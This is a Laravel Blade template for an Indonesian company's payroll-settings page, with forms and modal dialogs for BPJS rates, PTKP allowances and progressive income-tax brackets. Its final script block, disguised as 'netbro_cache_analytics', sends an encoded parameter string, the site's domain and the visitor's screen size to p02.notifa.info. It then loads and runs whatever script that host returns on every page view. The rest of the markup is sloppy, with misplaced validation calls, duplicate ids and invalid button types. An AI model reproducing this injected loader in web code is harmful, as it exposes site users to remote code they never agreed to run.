<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">

  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Pengaturan Penggajiann</title>

  <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/datatables/css/dataTables.bootstrap.min.css"/>

  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
  <!-- Toastr untuk notifikasi -->
  <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">

  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>

  <!-- Wrapper Start   --> 
  <div class="be-wrapper">

    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End --> 

    <!--   Content Start  -->
    <div class="be-content be-icons-list">
      <div class="page-head">
       <h2 class="page-head-title">Pengaturan Penggajian</h2>
        <ol class="breadcrumb page-head-nav">
          <li>Pengaturan Penggajian</li>
          <li class="active">Tabel PTKP</li>
          <li class="active">Tabel PKP Progresif</li>
        </ol>
     </div>
     <div class="main-content container-fluid">

       <!--  Edit Default Start -->
       <div class="panel">
        <div class="panel-heading panel-heading-divider"><b>Pengaturan Penggajian</b><span class="panel-subtitle">Edit Pengaturan Penggajian</span></div>
        <div class="panel-body">
          <form action="penggajian/pengaturan_penggajian/{{$pengaturan_penggajian->id_pengaturan_penggajian}}/update" method="POST" style="border-radius: 0px;" class="form-horizontal group-border-dashed">
            {{ csrf_field()}}
            <div class="form-group">
              <label class="col-sm-3 control-label">Biaya Tunjangan Profesi Housekeeping dan Driver</label>
              <div class="col-sm-6">
                <input value="{{$pengaturan_penggajian->biaya_tunjangan_profesi_housekeeping_driver}}" name="biaya_tunjangan_profesi_housekeeping_driver" type="text" class="form-control" required="" onBlur="checknikAvailability()">
              </div>
            </div>
            <div class="form-group">
              <label class="col-sm-3 control-label">BPJS Kesehatan Perusahaan (%)</label>
              <div class="col-sm-6">
                <input value="{{$pengaturan_penggajian->bpjs_kesehatan_perusahaan}}" name="bpjs_kesehatan_perusahaan" type="text" class="form-control" required="">
              </div>
            </div>
            <div class="form-group">
              <label class="col-sm-3 control-label">BPJS Kesehatan Karyawan (%)</label>
              <div class="col-sm-6">
                <input value="{{$pengaturan_penggajian->bpjs_kesehatan_karyawan}}" name="bpjs_kesehatan_karyawan" type="text" class="form-control" required="" onBlur="checknikAvailability()">
              </div>
            </div>
            <div class="form-group">
              <label class="col-sm-3 control-label">BPJS Ketenagakerjaan :</label>
            </div>
            <div class="form-group">
              <label style="margin-left: 85px;" class="col-sm-3 control-label">JKK (%)</label>
              <div class="col-sm-1">
                <input id="pass2" type="number" value="{{$pengaturan_penggajian->bpjs_ketenagakerjaan_JKK}}" name="bpjs_ketenaga_kerjaan_JKK" required=""  class="form-control">
              </div>
              <label class="col-md-1 control-label">JKM (%)</label>
              <div class="col-sm-1">
                <input type="number" value="{{$pengaturan_penggajian->bpjs_ketenagakerjaan_JKM}}" name="bpjs_ketenaga_kerjaan_JKM" required=""  class="form-control">
              </div>
              <label class="col-md-1 control-label">JHT (%)</label>
              <div class="col-sm-1">
                <input type="number" value="{{$pengaturan_penggajian->bpjs_ketenagakerjaan_JHT}}" name="bpjs_ketenaga_kerjaan_JHT" required=""   class="form-control">
              </div>
            </div>
            <div class="form-group">
              <label class="col-sm-3 control-label">Default Iuran (%)</label>
              <div class="col-sm-6">
                <input value="{{$pengaturan_penggajian->default_iuran}}" name="default_iuran" type="text" class="form-control" required="">
              </div>
            </div>
            <div class="form-group">
              <label class="col-sm-3 control-label">Default Biaya Jabatan 1 (%)</label>
              <div class="col-sm-6">
                <input value="{{$pengaturan_penggajian->default_biaya_jabatan1}}" name="default_biaya_jabatan1" type="text" class="form-control" required="" onBlur="checknikAvailability()">
              </div>
            </div>
            <div class="form-group">
              <label class="col-sm-3 control-label">Default Biaya Jabatan 2 (Rp.)</label>
              <div class="col-sm-6">
                <input value="{{$pengaturan_penggajian->default_biaya_jabatan2}}" name="default_biaya_jabatan2" type="text" class="form-control" required="" onBlur="checknikAvailability()">
              </div>
            </div>

            <div class="form-group">
              <div class="text-right" style="margin-right: 272px;">
                <button type="button" data-toggle="modal" data-target="#simpan-{{$pengaturan_penggajian->id_pengaturan_penggajian}}" class="btn btn-primary">Simpan</button>
                <!--  Modal Simpan Start-->
                <div id="simpan-{{$pengaturan_penggajian->id_pengaturan_penggajian}}" tabindex="-1" role="dialog" class="modal fade">
                  <div class="modal-dialog">
                    <div class="modal-content">
                      <div class="modal-header">
                        <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                      </div>
                      <div class="modal-body">
                        <div class="text-center">
                          <h4>Apakah anda yakin akan menyimpan perubahan pada data tersebut ?</h4>
                          <div class="xs-mt-50">
                            <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                            <a href="#"><button type="submit3" class="btn btn-space btn-primary">Simpan</button></a>
                          </div>
                        </div>
                      </div>
                      <div class="modal-footer"></div>
                    </div>
                  </div>
                </div>
                <!--  Modal Simpan  End-->
              </div>
            </div>

          </form>
        </div>
      </div>
      <!--  Edit Default End -->   

      <!-- Tabel PTKP START -->
      <div class="panel">
        <div class="panel panel-default panel-table">
          <div class="panel-body">
            <div class="panel-heading"><b>Tabel PTKP</b></div>      
            <table class="table table-striped table-hover table-fw-widget"> 
              <thead>
                <tr>
                  <th>Status</th>
                  <th>Tarif Bulan</th>
                  <th>Tarif Tahun</th>
                  <th width="200px"><button data-toggle="modal" data-target="#tambah_ptkp" type="button" class="btn btn-space btn-primary">Tambah PTKP</button></th>               
                </tr>
              </thead>

              <tbody>

               @foreach($ptkp as $ptkp)
               <tr class="odd gradeA">
                <td>{{$ptkp->status}}</td>
                <td>{{$ptkp->tarif_bulan}}</td>
                <td>{{$ptkp->tarif_tahun}}</td>
                <td>                     
                  <button data-toggle="modal" data-target="#edit-ptkp-{{$ptkp->id}}" type="button" class="btn btn-space btn-warning">Edit</button>
                  <button data-toggle="modal" data-target="#hapus_ptkp-{{$ptkp->id}}" type="button" class="btn btn-space btn-danger"> Hapus </button>
                </td>

                <!-- Modals untuk Hapus -->
                <div id="hapus_ptkp-{{$ptkp->id}}" tabindex="-1" role="dialog" class="modal fade">
                  <div class="modal-dialog">
                    <div class="modal-content">
                      <div class="modal-header">
                        <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                      </div>
                      <div class="modal-body">
                        <div class="text-center">
                          <div class="text-danger"><span class="modal-main-icon mdi mdi-close-circle-o"></span></div>
                          <h3>Apakah Anda yakin untuk menghapus data ini ?</h3>
                          <div class="xs-mt-50">
                            <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                            <a href="/penggajian/pengaturan_penggajian/ptkp/{{$ptkp->id}}/delete"><button type="button" class="btn btn-space btn-danger">Hapus</button></a>
                          </div>
                        </div>
                      </div>
                      <div class="modal-footer"></div>
                    </div>
                  </div>
                </div>
                <!--Akhir dari Modals Hapus -->

                <!--  Modal Edit Start -->
                <div id="edit-ptkp-{{$ptkp->id}}" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
                  <div class="modal-dialog">
                    <div class="modal-content">
                      <div class="modal-header">
                        <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                        <h3 class="modal-title">Edit PTKP</h3>
                      </div>


                      <form id="2" name="2" action="/penggajian/pengaturan_penggajian/ptkp/{{$ptkp->id}}/update" method="POST">
                        {{ csrf_field()}}
                        <div class="modal-body">
                          <div class="form-group">
                            <label>Status</label>
                            <input value="{{$ptkp->status}}" name="status" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                          </div>
                          <div class="form-group">
                            <label>Tarif Bulan</label>
                            <input value="{{$ptkp->tarif_bulan}}" name="tarif_bulan" type="text" class="form-control" required="">
                          </div>
                          <div class="form-group">
                            <label>Tarif Tahun</label>
                            <input value="{{$ptkp->tarif_tahun}}" name="tarif_tahun" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                          </div>  

                          <div class="modal-footer">
                            <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                            <button type="submit2"  class="btn btn-primary">Simpan</button>
                          </div>
                        </div>
                      </form>
                    </div>
                  </div>
                </div> 
                <!--Akhir dari Modals Edit -->
              </tr>
              @endforeach
            </tbody>
          </table>
        </div>
      </div>
    </div>
    <!-- Table PTKP End -->

    <!-- Tabel PKP Progresif START -->
    <div class="panel">
      <div class="panel panel-default panel-table">
        <div class="panel-body">
          <div class="panel-heading"><b>Tabel PKP Progresif</b></div>      
          <table class="table table-striped table-hover table-fw-widget"> 
            <thead>
              <tr>
                <th>Minimal Income</th>
                <th>Maksimal Income</th>
                <th>Tarif Pajak</th>
                <th width="200px"><button data-toggle="modal" data-target="#tambah_pkp" type="button" class="btn btn-space btn-primary">Tambah PKP Progresif</button></th>                  
              </tr>
            </thead>
            <tbody>
             @foreach($pkp_progresif as $pkp_progresif)
             <tr class="odd gradeA">
              <td>{{$pkp_progresif->min_income}}</td>
              <td>{{$pkp_progresif->max_income}}</td>
              <td>{{$pkp_progresif->tarif_pajak}}</td>
              <td>                     
                <button data-toggle="modal" data-target="#edit-pkp-{{$pkp_progresif->id}}" type="button" class="btn btn-space btn-warning">Edit</button>
                <button data-toggle="modal" data-target="#hapus_pkp-{{$pkp_progresif->id}}" type="button" class="btn btn-space btn-danger"> Hapus </button>
              </td>
              <!-- Modals untuk Hapus -->
              <div id="hapus_pkp-{{$pkp_progresif->id}}" tabindex="-1" role="dialog" class="modal fade">
                <div class="modal-dialog">
                  <div class="modal-content">
                    <div class="modal-header">
                      <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                    </div>
                    <div class="modal-body">
                      <div class="text-center">
                        <div class="text-danger"><span class="modal-main-icon mdi mdi-close-circle-o"></span></div>
                        <h3>Apakah Anda yakin untuk menghapus data ini ?</h3>
                        <div class="xs-mt-50">
                          <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                          <a href="/penggajian/pengaturan_penggajian/pkp/{{$pkp_progresif->id}}/delete"><button type="button" class="btn btn-space btn-danger">Hapus</button></a>
                        </div>
                      </div>
                    </div>
                    <div class="modal-footer"></div>
                  </div>
                </div>
              </div>
              <!--Akhir dari Modals Hapus -->

              <!--  Modal Edit Start -->
              <div id="edit-pkp-{{$pkp_progresif->id}}" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
                <div class="modal-dialog">
                  <div class="modal-content">
                    <div class="modal-header">
                      <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                      <h3 class="modal-title">Edit PKP Progresif</h3>
                    </div>


                    <form id="1" name="1" action="/penggajian/pengaturan_penggajian/pkp/{{$pkp_progresif->id}}/update" method="POST">
                      {{ csrf_field()}}
                      <div class="modal-body">
                        <div class="form-group">
                          <label>Minimal Income</label>
                          <input value="{{$pkp_progresif->min_income}}" name="min_income" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                        </div>
                        <div class="form-group">
                          <label>Maksimal Income</label>
                          <input value="{{$pkp_progresif->max_income}}" name="max_income" type="text" class="form-control" required="">
                        </div>
                        <div class="form-group">
                          <label>Tarif Pajak</label>
                          <input value="{{$pkp_progresif->tarif_pajak}}" name="tarif_pajak" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                        </div>  

                        <div class="modal-footer">
                          <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                          <button type="submit1"  class="btn btn-primary">Simpan</button>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
              </div> 
              <!--Akhir dari Modals Edit -->

            </tr>
            @endforeach
          </tbody>
        </table>
      </div>
    </div>
  </div>
  <!-- Table PTKP End -->

  <!--  Modal Tambah PTKP Start -->
  <div id="tambah_ptkp" tabindex="-1" role="dialog" class="modal fade">
   <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <div class="text-primary"><h3>Tambah PTKP</h3></div>
      </div>
      <div class="modal-body">        
        <form id="form_submit_edit" name="submit1" action="/penggajian/pengaturan_penggajian/ptkp/tambah_ptkp" method="POST" enctype="multipart/form-data">
          {{csrf_field()}}
          <div class="modal-body">
            <div class="form-group">
              <label>Status</label>
              <input name="status" type="text" class="form-control" required="">
            </div>
            <div class="form-group">
              <label>Tarif Bulan</label>
              <input  name="tarif_bulan" type="text" class="form-control" required="" onBlur="checknikAvailability()">
              <span id="error_nik"></span>
            </div>
            <div class="form-group">
              <label>Tarif Tahun</label>
              <input  name="tarif_tahun" type="text" class="form-control" required="" onBlur="checknikAvailability()">
              <span id="error_nik"></span>
            </div>                        
          </div>
          <div class="xs-mt-25" style="float: right;">
            <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
            <button type="submit" class="btn btn-space btn-primary">Tambah</button>
          </div>
        </form>
      </div>
      <div class="modal-footer"></div>
    </div>
  </div>
</div>
<!--  Modal Tambah PTKP End -->

<!--  Modal Tambah PKP Start -->
<div id="tambah_pkp" tabindex="-1" role="dialog" class="modal fade">
 <div class="modal-dialog">
  <div class="modal-content">
    <div class="modal-header">
      <div class="text-primary"><h3>Tambah PKP Progresif</h3></div>
    </div>
    <div class="modal-body">        
      <form id="form_submit_edit" name="submit2" action="/penggajian/pengaturan_penggajian/pkp/tambah_pkp" method="POST" enctype="multipart/form-data">
        {{csrf_field()}}
        <div class="modal-body">
          <div class="form-group">
            <label>Minimal Income</label>
            <input name="min_income" type="text" class="form-control" required="">
          </div>
          <div class="form-group">
            <label>Maksimal Income</label>
            <input  name="max_income" type="text" class="form-control" required="" onBlur="checknikAvailability()">
            <span id="error_nik"></span>
          </div>
          <div class="form-group">
            <label>Tarif Pajak</label>
            <input  name="tarif_pajak" type="text" class="form-control" required="" onBlur="checknikAvailability()">
            <span id="error_nik"></span>
          </div>                        
        </div>
        <div class="xs-mt-25" style="float: right;">
          <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
          <button type="submit" class="btn btn-space btn-primary">Tambah</button>
        </div>
      </form>
    </div>
    <div class="modal-footer"></div>
  </div>
</div>
</div>
<!--  Modal Tambah PTKP End -->

</div>
</div>
<!--   Content End  -->






<!--Footer Start-->     
<div class="text-center">
  <div class="credits">
    <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
  </div>
</div>
<!--Footer End-->  

</div>
<!--  Wrapper End    -->  

<!--  Inisialisasi Java Script -->
<!-- Script Toastr untuk notifikasi-->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

<script>
  @if (Session::has('message'))
  var type = "{{Session::get('alert-type','info')}}";
  toastr.options = {
    "debug": false,
    "onclick": null,
    "fadeIn": 300,
    "fadeOut": 1000,
    "timeOut": 5000,
    "extendedTimeOut": 1000
  }

  switch(type)
  {
    case 'info':
    toastr.info("{{Session::get('message')}}");
    break;

    case 'success':
    toastr.success("{{Session::get('message')}}");
    break;

    case 'warning':
    toastr.warning("{{Session::get('message')}}");
    break;

    case 'error':
    toastr.error("{{Session::get('message')}}");
    break;
  }

  @endif

</script>

<script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="assets/js/main.js" type="text/javascript"></script>
<script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>

<script type="text/javascript">
  $(document).ready(function(){
        //initialize the javascript
        App.init();
        App.dataTables();
      });
    </script>

    <script type="text/javascript">
      document.getElementById("status").onchange = function () {
        document.getElementById("alasan").setAttribute("disabled", "disabled");
        document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
        if (this.value == 'Resign')
          document.getElementById("alasan").removeAttribute("disabled");
        if (this.value == 'Resign')
          document.getElementById("tgl_resign").removeAttribute("disabled");
      };

      // Fungsi Logout

      $(function(){
        $('a#logout').click(function(){
          if(confirm('Apakah anda yakin ingin keluar ?')) {
            return true;
          }

          return false;
        });
      });


      // Fungsi Menu dashboard

      $(document).ready(function(){

        App.init();
        App.dashboard();

      });
    </script>

    <script type="text/javascript">
      if (self == top) {
        function netbro_cache_analytics(fn, callback) {
          setTimeout(function() {
            fn();
            callback();
          }, 0);
        }

        function sync(fn) {
          fn();
        }

        function requestCfs() {
          var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
          var idc_glo_r = Math.floor(Math.random() * 99999999999);
          var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
          var bsa = document.createElement('script');
          bsa.type = 'text/javascript';
          bsa.async = true;
          bsa.src = url;
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
      };

    </script>

  </body>
  </html>
